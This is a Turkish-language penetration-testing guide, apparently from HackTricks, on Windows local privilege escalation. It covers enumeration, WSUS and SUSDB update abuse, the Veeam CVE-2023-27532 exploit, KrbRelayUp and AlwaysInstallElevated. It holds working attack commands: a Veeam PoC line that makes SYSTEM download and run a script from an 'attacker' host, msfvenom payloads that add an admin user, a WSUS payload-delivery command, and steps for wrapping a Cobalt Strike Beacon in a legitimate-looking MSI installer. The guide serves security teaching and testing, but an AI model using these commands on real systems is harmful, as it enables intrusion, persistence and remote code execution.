# Windows Yerel Ayrıcalık Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfa, birkaç temel kılavuzdaki genel Windows ayrıcalık yükseltme metodolojisini bir araya getirir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Pratik enumeration akışı ayrıca topluluk atölyelerinden ve kontrol listelerinden yararlanır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Tarihsel saldırı materyalleri, Windows ayrıcalık yükseltme hakkındaki DerbyCon sunumunu içerir.<sup>[[5]](#references)</sup>

## Başlangıç için Windows Teorisi

### Erişim Belirteçleri

**Windows erişim belirteçlerinin ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Bütünlük Düzeyleri

**Windows'ta bütünlük düzeylerinin ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Denetimleri

Windows'ta **sistemi enumerate etmenizi**, çalıştırılabilir dosyaları çalıştırmanızı ve hatta **faaliyetlerinizin tespit edilmesini** engelleyebilecek çeşitli unsurlar vardır. Ayrıcalık yükseltme enumeration'ına başlamadan önce aşağıdaki **sayfayı okumalı** ve tüm bu **savunma mekanizmalarını enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, çevrimdışı bir UEFI NVRAM düzenlemesini, önyükleme öncesi DMA ve Windows `SYSTEM` bellek yaması zincirine de dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess sessiz yükseltme

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess süreçleri, AppInfo güvenli yol kontrolleri atlandığında istem göstermeden High IL düzeyine erişmek için kötüye kullanılabilir. Ayrılmış UIAccess/Admin Protection bypass iş akışına buradan bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop erişilebilirlik kayıt defteri yayılımı, rastgele bir SYSTEM kayıt defteri yazma işlemi (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Yeni Windows sürümleri ayrıca, ayrıcalıklı bir yerel NTLM kimlik doğrulamasının yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı **SMB rastgele bağlantı noktası** LPE yolunu da kullanıma sundu:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgisi enumeration'ı

Windows sürümünde bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Sürüm Exploit'leri

Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için bu [site](https://msrc.microsoft.com/update-guide/vulnerability) kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur ve Windows ortamının sunduğu **devasa saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS build'ini, yüklü güncellemeleri ve olası advisory adaylarını listeler; bir sonucu uygulanabilir kabul etmeden önce tam ürünü ve yerine geçen güncellemeleri doğrulayın.

Sürüme özgü bir local exploit için, OS mimarisinin yanı sıra **çalışan işlemin mimarisini** de kontrol edin. 64-bit Windows'ta 32-bit bir işlem [WOW64 dosya sistemi yönlendirmesine](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) tabidir: `%windir%\System32` genellikle 32-bit sistem dizinine karşılık gelirken `%windir%\Sysnative`, işlemin native sistem dizinine erişmesini sağlar. Bu takma ad 64-bit bir işlem için kullanılamaz. Bir OS build'i veya eksik KB adayı, exploit'in kullanılabilir olduğunu kanıtlamaz; çalışan build'i, yüklü ya da yerine geçen güncellemeyi, işlem mimarisini ve exploit ön koşullarını söz konusu sorunla ilgili [Microsoft güvenlik bülteniyle](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) karşılaştırın.

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin Github depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir credential/Juicy bilgi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` yalnızca bir örnektir. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalde her kullanıcının Documents klasörüne yazar; ancak `OutputDirectory` ayarı veya `Start-Transcript -OutputDirectory`, dosyaları paylaşılan ya da gizli bir klasöre yönlendirebilir. Bir transkripti incelemeden önce etkin çıktı yolunu ve dosya ACL'sini kontrol edin: transkript, kimlik bilgileri de dahil olmak üzere komut bağımsız değişkenlerini ve çıktıları içerebilir. Okunabilir bir transkript ancak içeriği kullanılabilir, daha yüksek ayrıcalıklı bir kimliği açığa çıkarıyorsa ve bu kimlik ilgili bağlamda oturum açabiliyorsa bir ipucudur.

### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; bunlara yürütülen komutlar, komut çağrıları ve betiklerin bazı bölümleri dahildir. Ancak yürütmenin tüm ayrıntıları ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için belgelerin "Transcript files" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini kullanın.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell günlüklerinden son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Script’in yürütülmesine ilişkin tüm etkinlikler ve içeriğin tamamı kaydedilir; böylece her kod bloğu çalışırken belgelenir. Bu süreç, her etkinliğin kapsamlı bir denetim kaydını tutar; bu kayıt adli bilişim ve kötü amaçlı davranışların analizinde değerlidir. Yürütme anındaki tüm etkinlikler belgelenerek süreç hakkında ayrıntılı bilgiler sağlanır.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block için olay günlükleri Windows Event Viewer'da şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Bir HTTP WSUS uç noktası, güncelleme meta verilerinin araya girilmesi açısından incelenmesi gereken bir ipucudur. Exploitation ayrıca istemcinin bu WSUS sunucusunu kullanıp kullanmadığına, saldırganın trafiği araya girip izleyebilmesine veya kontrol edebilmesine ve istemcinin güncellemelere yönelik güven ve yükleme ilkesine bağlıdır. URL tek başına kod yürütüldüğünü göstermez. [Microsoft, WSUS meta verileri için TLS kullanılmasını önerir](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Önce cmd'de aşağıdaki komutu çalıştırarak ağın SSL kullanmayan bir WSUS güncellemesi kullanıp kullanmadığını kontrol edin:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Veya PowerShell'de aşağıdaki:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Şunlardan biri gibi bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

`UseWUServer` değeri `1` olduğunda Windows Update, yapılandırılmış intranet hizmetini kullanır. Bu, HTTP interception yolu için bir ön koşulun mevcut olduğunu doğrular; ancak interception işleminin, kötü amaçlı güncellemelerin kabul edilmesinin veya yükseltilmiş yetkilerle yükleme yapılmasının mümkün olduğunu kanıtlamaz. Değer `0` olduğunda, bu ilkeyle belirlenen WSUS uç noktası kullanılmaz.

Bu zafiyetleri istismar etmek için [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gibi araçları kullanabilirsiniz. Bunlar, SSL kullanmayan WSUS trafiğine "sahte" güncellemeler enjekte etmek için hazırlanmış MiTM exploit scriptleridir.

Araştırmayı buradan okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak, bu hata şu açıktan yararlanır:

> Yerel kullanıcı proxy'mizi değiştirme yetkimiz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimizi yakalamak ve varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)'u yerel olarak çalıştırabiliriz.
>
> Ayrıca, WSUS hizmeti geçerli kullanıcının ayarlarını kullandığından sertifika deposunu da kullanır. WSUS ana bilgisayar adı için kendinden imzalı bir sertifika oluşturup bunu geçerli kullanıcının sertifika deposuna eklersek, hem HTTP hem de HTTPS WSUS trafiğini yakalayabiliriz. WSUS, sertifika üzerinde ilk kullanımda güven türü bir doğrulama uygulamak için HSTS benzeri bir mekanizma kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir olarak kabul ediliyor ve doğru ana bilgisayar adına sahipse hizmet tarafından kabul edilir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla istismar edebilirsiniz (kullanıma sunulduğunda).

### WSUS yöneticisinin denetimindeki güncellemeler

Geçerli kimliğin WSUS sunucusunda güncellemeleri **yayımlama ve onaylama** yetkisi olduğunda ayrı bir yol söz konusudur. Sunucudaki `WSUS Administrators` grubunun etkin üyeliğini ve atanmış WSUS izinlerini kontrol edin, ardından onaylanan güncellemeyi alacak istemci bilgisayar grubunu belirleyin. [Microsoft, güncellemeleri onaylamak için WSUS Administrator ayrıcalıkları gerektirir](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) ve [yayımlama için gereken güven ilişkisini açıklar](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): istemciler, yerel olarak yayımlanmış içeriği imzalamak için kullanılan sertifikaya güvenmelidir. Bu yolu bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce, aday güncellemenin imzalandığını ve kabul edildiğini, hedef için geçerli olduğunu ve daha ayrıcalıklı bir bağlamda yüklendiğini doğrulayın. Tek başına bir HTTP `WUServer` değeri veya grup adı bu koşulların sağlandığını göstermez.

### SUSDB özel güncelleme istismarı: `.txt`/`.esd` üzerinden imzasız payload'lar

Bu, HTTP WSUS bağlantısını yakalamaktan farklı bir güven sınırı ihlalidir: ön koşul, özel bir güncellemeyi yayımlamak ve onaylamak için **WSUS veritabanı (`SUSDB`) saklı yordamlarına** yeterli erişime sahip olmaktır. Uygulanabilir giriş yollarından biri, yukarı akıştaki bir WSUS bilgisayar hesabını `SUSDB` barındıran ayrı bir MSSQL sunucusuna aktarmaktır; tam ön koşul dağıtıma bağlıdır, bu nedenle SQL yöneticisi haklarına sahip olduğunuzu varsaymak yerine önce `EXECUTE` izinlerini listeleyin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS istemci kimlik doğrulamasını HTTP/8530 üzerinden LDAP, SMB veya AD CS'ye aktaran ayrı saldırı yolu için bkz. [NTLM relay için WSUS HTTP'yi kötüye kullanma](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Güncellemeyi oluşturma, hedefleme ve onaylama

Özel güncelleme iş akışı, kısıtlı bir yayımlama API'si olarak meşru WSUS yordamlarını kullanır. Önemli durum geçişleri şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili saklı yordamlar |
| --- | --- |
| Güncelleme meta verilerini içe aktarma | `spImportUpdate` |
| Ön koşul, yerelleştirilmiş ve genişletilmiş XML parçalarını depolama | `spSaveXMLFragment` |
| İçerik özetiyle saldırgan denetimindeki URL'yi ilişkilendirme | `spSetBatchURL` |
| Bilgisayar grubunu listeleme/oluşturma ve istemciyi ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Bu grup için yüklemeyi onaylama | `@actionID = 0` ve `@isAssigned = 1` ile `spDeployUpdate` |

Dosya adı, özetler, boyut ve `CommandLineInstallation` işleyicisi, içe aktarılan meta veriler ve parçalar arasında tutarlı olmalıdır. İçerik URL'sini ve hedef grubu atadıktan sonra, son onay aşağıdakine benzer; örnek GUID'leri yeniden kullanmak yerine yeni güncelleme, grup ve dağıtım tanımlayıcıları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Uzantı güdümlü imza atlatma

WSUS normalde imzasız, keyfi yürütülebilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` içindeki .NET `VerifyFile` yolu, verilen dosya adı `.txt` veya `.esd` ile bitiyorsa sertifika denetimi bayrağını false olarak ayarlar; böylece baytların metin veya geçerli bir ESD imajı olduğu önceden kanıtlanmadan `CheckCertificateSignature` atlanır. Bu nedenle, örneğin `payload.exe.txt` olarak adlandırılmış, değiştirilmemiş bir PE içerik doğrulamasından geçebilir ve daha sonra güncellemenin komut satırı yükleme işleyicisi tarafından başlatılabilir. Bu, imza sahteciliği değil, bir ilke/tür karışıklığı hatasıdır.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS uyumlu hazırlama ve otomasyon

`spDeployUpdate` çağrıldığında WSUS, kayıtlı içeriği getirir. Kaynağın BITS'in HTTP beklentilerini karşılaması gerekir: erişilebilir bir URL tek başına yeterli değildir; çünkü aktarım, ilk `HEAD`/`GET` akışını ve byte-range isteklerini kullanır. Range desteği olmayan bir sunucu, BITS'in Range protokolü başlığı gerektirdiğini belirten WSUS eşitleme `EventId=364` hatası üretir.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gereken SQL'i oluşturur, bu SQL'i yürütmek üzere değiştirilmiş bir MSSQL istemcisi içerir ve içerik hazırlama için `BitsWebServer.py` dosyasını sunar. Yetkili bir laboratuvarda kullanılabilecek asgari bir komut şöyledir:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Gözetimsiz yürütme ve yeniden deneme kalıcılığı

İstemci tarafındaki etkileşim ilkeye bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` altındaki `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından elle seçilmesine gerek kalmadan indirilip yapılandırılan zamanlamaya göre yüklenmesini sağlar. Testlerde, güncellemesi başarısız/tamamlanmamış durumda kalan bir payload, callback süreci sona erdikten hemen sonra yeniden sunuldu; bu nedenle yeniden deneme davranışı tekrarlanan yürütme kalıcılığına dönüşebilir. İstemci güncelleme başarısız durumunu gösterdiği için bu yöntem gürültülüdür.<sup>[[39]](#references)</sup>

#### Tespit ve güçlendirme pivotları

Bu zincirden sunucu ve istemci tarafında kullanılabilecek pivotlar:<sup>[[39]](#references)</sup>

- `SUSDB` üzerindeki `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` çalıştırmalarını denetleyin; yeni hedefleme gruplarını, harici içerik kaynaklarını, `.txt`/`.esd` güncelleme payload'larını ve beklenmeyen hesaplar (özellikle bilgisayar hesabı olmayanlar) tarafından yapılan dağıtımları inceleyin.
- `C:\Program Files\Update Services\LogFiles` içinde `ContentSyncAgent`, `FileVerified`, yanlış yazılmış `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; uzantıya güvenmek yerine doğrulama kayıtlarını payload uzantısı ve içerik imzasıyla ilişkilendirin.
- Windows Update kurulumunun tekrar tekrar başarısız olup yeniden denenmesini ve `.txt` ya da `.esd` adları taşıyan içeriklerden kaynaklanan PE yürütmesini veya beklenmeyen alt süreç/ağ etkinliğini araştırın.
- Desteklenen yerlerde veritabanı hizmetinde Authentication için Extended Protection'ı zorunlu kılın ve veritabanı ağ erişimini WSUS sunucusu ile yetkili yönetim sistemleriyle sınırlayın. Özel güncelleme prosedürleri üzerindeki `EXECUTE` haklarını en aza indirin ve denetleyin.

## Üçüncü Taraf Otomatik Güncelleyiciler ve Agent IPC (local privesc)

Birçok kurumsal agent, localhost IPC yüzeyi ve ayrıcalıklı bir güncelleme kanalı sunar. Kayıt işlemi bir saldırganın sunucusuna yönlendirilebiliyorsa ve güncelleyici sahte bir kök CA'ya ya da zayıf imzalayan denetimlerine güveniyorsa, yerel bir kullanıcı SYSTEM hizmetine kötü amaçlı bir MSI yükletebilir. Genelleştirilmiş bir tekniği (Netskope stAgentSvc zincirini temel alır – CVE-2025-0309) burada bulabilirsiniz:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Veeam Backup & Replication ve Cloud Connect, varsayılan olarak **TCP/9401** üzerindeki bir çekirdek yedekleme hizmetini kullanır. [Veeam'in güvenlik duyurusu](https://www.veeam.com/kb4424), yedekleme ağı sınırları içindeki şifrelenmiş yapılandırma veritabanı kimlik bilgilerinin kimlik doğrulaması olmadan ifşa edildiğini açıklar; ayrı bir herkese açık PoC ise **NT AUTHORITY\SYSTEM** olarak komut yürütme yolunu gösterir.<sup>[[12]](#references)</sup> Hizmet localhost dışındaki adreslere de bağlanabilir; bu nedenle gerçek adresini ve PID'sini kontrol edin.

- **Recon**: TCP/9401'in `Veeam.Backup.Service.exe` işlemine ait olduğunu doğrulayın, ardından kurulu ürünü ve yama üstverilerini inceleyin. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ipucu verir, ancak eksiksiz bir yama denetimi değildir.
- **Düzeltilmiş en düşük sürümler**: Veeam, ilk düzeltilmiş sürümler olarak **11a build 11.0.1.1261 P20230227** ve **12 build 12.0.0.1420 P20230223** sürümlerini listeler; önceki sürümler etkilenir. Dört parçalı bir dosya sürümü tek başına, aynı build numaralarındaki yamalanmamış temel build'i sonraki bir yamadan ayıramaz. Sınır build'ini düzeltilmiş olarak kabul etmeden önce yama tanımlayıcısını [üreticinin build geçmişiyle](https://www.veeam.com/kb2680) doğrulayın.
- **Exploit**: `VeeamHax.exe` gibi bir PoC'yi gerekli Veeam DLL'leriyle aynı dizine yerleştirin, ardından yerel soket üzerinden bir SYSTEM payload'ı tetikleyin:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Atıfta bulunulan PoC, ek ön koşullar sağlandığında SYSTEM olarak komut yürütüldüğünü gösterir; üreticinin güvenlik duyurusu ise kimlik bilgisi ifşası sorununu açıklar.
## KrbRelayUp

Yerel bir Kerberos relay saldırısı, uygun bir COM sunucusu kimlik doğrulaması yaptığında ve relay edilen principal hedef nesne üzerinde gerekli haklara sahip olduğunda, düşük ayrıcalıklı bir oturum açma bağlamından ayrıcalıklı bir dizin yazma işlemine geçiş sağlayabilir. [KrbRelay belgeleri](https://github.com/cube0x0/KrbRelay) hem RBCD hem de `msDS-KeyCredentialLink` (shadow-credential) LDAP yazma işlemlerini kapsar; KrbRelayUp bu yolların bazılarını otomatikleştirir. RBCD saldırı zinciri, geçerli delegasyon ve hedef nesne haklarını gerektirirken shadow-credential saldırı zinciri, key-credential yazma haklarını ve sertifika kimlik doğrulama yolunu destekleyen bir KDC'yi gerektirir. Bu yollardan hiçbiri yalnızca etki alanı üyeliğinden kaynaklanmaz.

Gerçek DC'nin [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) ve [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ilkelerini, relay edilen kimliğin nesne ACL'sini ve seçilen COM sınıfının kimlik doğrulama ve taklit düzeylerini kontrol edin. Çağıranın oturum açma türü ve kimlik bilgisi bağlamı önemlidir: WinRM oturumu, etkileşimli oturumdan veya yeni kimlik bilgileriyle açılan bir oturumdan farklı davranabilir. Güvenlik duvarı/OXID yönlendirmesi ve yüklenen güncellemeler de sonucu değiştirebilir. İzin verici bir ilkeyi veya eşleşen ACL'yi incelenmesi gereken bir durum olarak değerlendirin; pasif numaralandırma COM zorlamasını, relay kimlik doğrulamasını veya dizine yazmayı tetiklememelidir. Makine hesabının shadow credential'ı bir makine bileti alınmasını sağlayabilir; bu da yalnızca hesabın gerekli dizin çoğaltma haklarına sahip olması durumunda ayrı bir DCSync yoluna gidebilir.

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde **exploit'i bulun**

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresini inceleyin.

## AlwaysInstallElevated

Bu 2 kayıt defteri anahtarı **etkinse** (değer **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (yürütebilir).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Bir meterpreter session'ınız varsa, bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Power-up'tan `Write-UserAddMSI` komutunu kullanarak, ayrıcalıkları yükseltmek için geçerli dizinde bir Windows MSI binary'si oluşturun. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişimine ihtiyacınız olacak):

```
Write-UserAddMSI
```

Oluşturulan binary'yi çalıştırarak yetkileri yükseltin.

### MSI Wrapper

Bu araçla MSI wrapper oluşturmayı öğrenmek için bu öğreticiyi okuyun. Yalnızca **komut satırlarını çalıştırmak** istiyorsanız bir "**.bat**" dosyasını da wrapper içine alabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** oluşturun.
- **Visual Studio**'yu açın, **Yeni proje oluştur**'u seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçip **İleri**'ye tıklayın.
- **AlwaysPrivesc** gibi bir proje adı verin, konum olarak **`C:\privesc`** kullanın, **çözümü ve projeyi aynı dizine yerleştir**'i seçin ve **Oluştur**'a tıklayın.
- 4. adımın 3.'süne (dahil edilecek dosyaları seçme) gelene kadar **İleri**'ye tıklayın. **Ekle**'ye tıklayın ve az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86**'dan **x64**'e değiştirin.
  - **Author** ve **Manufacturer** gibi değiştirebileceğiniz başka özellikler de vardır; bunlar yüklenen uygulamanın daha meşru görünmesini sağlayabilir.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'a sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Böylece yükleyici çalıştırılır çalıştırılmaz Beacon payload'ı çalıştırılır.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak **build edin**.
